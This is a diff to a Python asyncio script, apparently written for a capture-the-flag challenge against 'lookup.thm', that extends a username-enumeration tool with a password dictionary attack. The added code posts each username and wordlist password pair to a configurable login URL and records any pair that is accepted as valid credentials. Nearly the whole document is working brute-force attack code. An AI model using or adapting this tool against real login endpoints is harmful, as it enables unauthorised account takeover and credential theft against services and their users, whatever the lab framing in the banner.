@@ -18,7 +18,8 @@ parser = argparse.ArgumentParser(
     epilog='Example: ./ghost.py -u http://target.com/login -l <wordlist>'
 )
 parser.add_argument('-u', '--url', required=True, help='Target login endpoit URL (for this challenge: http://<lookup.thm>/login.php')
-parser.add_argument('-l', '--login', required=True, help='Username wordlist')
+parser.add_argument('-l', '--login', required=True, help='Path to usernames wordlist')
+parser.add_argument('-P', '--password', required=True, help='Path to passwords wordlist')
 args = parser.parse_args()
 
 
@@ -53,6 +54,24 @@ def banner():
     cprint("[!] This tool is not intended for use outside of this scope \n",'red')
 
 
+valid_usernames = []
+
+valid_creds = {}
+
+async def validate_password(response_text):
+    if 'wrong password' in response_text.lower():
+        return False
+    return True
+
+async def brute_force_passwords(session,username,password):
+    data['username'] = username
+    data['password'] = password
+    async with session.post(args.url,data=data,headers=headers) as response:
+        response_text = await response.text()
+        if await validate_password(response_text):
+            cprint(f'[**] Valid credentials found: {username} : {password}','green')
+            valid_creds[username] = password
+
 async def validate_username(response_text):
     if 'wrong username' in response_text.lower():
         return False
@@ -60,22 +79,31 @@ async def validate_username(response_text):
 
 async def send_request(session, username):
     data['username'] = username
-    async with session.post('http://lookup.thm/login.php', data=data, headers=headers) as response:
+    async with session.post(args.url, data=data, headers=headers) as response:
         response_text = await response.text()
         if await validate_username(response_text):
             cprint(f'[+] username found: {username}', 'green')
+            valid_usernames.append(username)
 
 async def main():
-    
+
     try:
         with open(args.login, 'r',encoding='ISO-8859-1' ) as wordlist_file: #Changed encoding from UTF-8 to ISO to work with rockyou.txt
             usernames = [username.strip() for username in wordlist_file.readlines()]
 
-        cprint(f'[!] Wordlist loaded successfully: {len(usernames)} usernames detected','yellow')
+        cprint(f'[!] Wordlist loaded successfully: {len(usernames)} usernames loaded','yellow')
         cprint(f'[!] Enumerating target {args.url} with provided usernames ...','yellow')
     except Exception as e:
         print(f'[!] An error ocurred while loading wordlist: {e}','red')
 
+    try: 
+        with open(args.password,'r',encoding='ISO-8859-1') as passwords_file:
+            passwords = [password.strip() for password in passwords_file.readlines()]
+
+        cprint(f'[!] Password list loaded sucessfully: {len(passwords)} passwords to guess','yellow')
+    except Exception as e:
+        print(f'[!] An error ocurred while loading passwords list: {e}','red')
+    
     async with aiohttp.ClientSession() as session:
         tasks = []
         for username in usernames:
@@ -83,6 +111,15 @@ async def main():
             tasks.append(task)
         
         await asyncio.gather(*tasks)
+
+        tasks2 = []
+        for login in valid_usernames:
+            cprint(f"[+] Starting dictionary attack on user: {login} ...",'blue')
+            for password in passwords:
+                task = asyncio.create_task(brute_force_passwords(session,login,password))
+                tasks2.append(task)
+
+            await asyncio.gather(*tasks2)
 
 if __name__ == '__main__':
     banner()
